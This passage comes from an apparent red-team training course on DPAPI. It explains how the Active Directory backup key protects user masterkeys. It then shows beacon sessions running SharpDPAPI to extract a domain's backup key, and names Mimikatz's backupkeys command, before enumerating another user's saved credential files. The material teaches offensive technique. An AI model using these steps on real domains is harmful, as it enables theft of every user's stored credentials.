
As we've seen in previous chapters there are some secrets, like those stored in the [Windows Credential Manager](https://www.zeropointsecurity.co.uk/path-player?courseid=red-team-ops&unit=677fb3f7bc8c65b5c600bcd8), that are protected using the Data Protection API (DPAPI).  The secrets themselves are encrypted with a randomly generated AES key, called a masterkey, which itself is encrypted using DPAPI.  The private key that DPAPI uses to encrypt the masterkey is derived from the user's password.  This, in theory, means only that user can decrypt the key and access their saved secrets.  However, when the user changes their password (or it's changed by an administrator), DPAPI can no longer generate keys to decrypt their masterkey.

To that end, a copy of the user's masterkey is encrypted with a "backup key" that is stored in Active Directory.  This allows a user to decrypt the backup copy of their masterkey, and then re-encrypt a new copy using a key derived from their updated password.  From an adversarial perspective, obtaining this backup key ultimately allows them to decrypt all DPAPI blobs for any user in the domain, which may be useful for maintaining access to sensitive credentials. 

The backup key is randomly generated during the initial creation of the domain, and like the krbtgt secret, is never automatically changed.  However, there is also no officially supported way of changing it.  It can be extracted from a domain controller (by a domain administrator) using the [BackupKey Remote Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-bkrp/90b08be4-5175-4177-b4ce-d920d797e3a8).  This is built into tools such as Mimikatz's `lsadump::backupkeys` command and SharpDPAPI's `backupkey` command.

```powershell
beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe backupkey

[*] Action: Retrieve domain DPAPI backup key

[*] Using current domain controller  : lon-dc-1.contoso.com
[*] Preferred backupkey Guid         : 12c95677-bb3d-4932-aab9-1e89c1dd005d
[*] Full preferred backupKeyName     : G$BCKUPKEY_12c95677-bb3d-4932-aab9-1e89c1dd005d
[*] Key                              : HvG1s[...snip...]lXQns=
```

With local admin access to a computer, an adversary can enumerate saved credentials for all users.  The example below how a session running in high-integrity as _dyork_ can enumerate credentials stored by _pchilds_.

```powershell
beacon> getuid
[*] You are CONTOSO\dyork (admin)

beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials

[*] Action: User DPAPI Credential Triage

[*] Triaging Credentials for ALL users

Folder       : C:\Users\pchilds\AppData\Local\Microsoft\Credentials\

  CredFile           : 9CAEEF854B7702E986B47C751DFE9AD2

    guidMasterKey    : {120b3a8a-683d-4db8-8f13-e4c466949bd2}
    size             : 396
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32772 (CALG_SHA) / 26115 (CALG_3DES)
    description      : Local Credential Data

    [X] MasterKey GUID not in cache: {120b3a8a-683d-4db8-8f13-e4c466949bd2}
```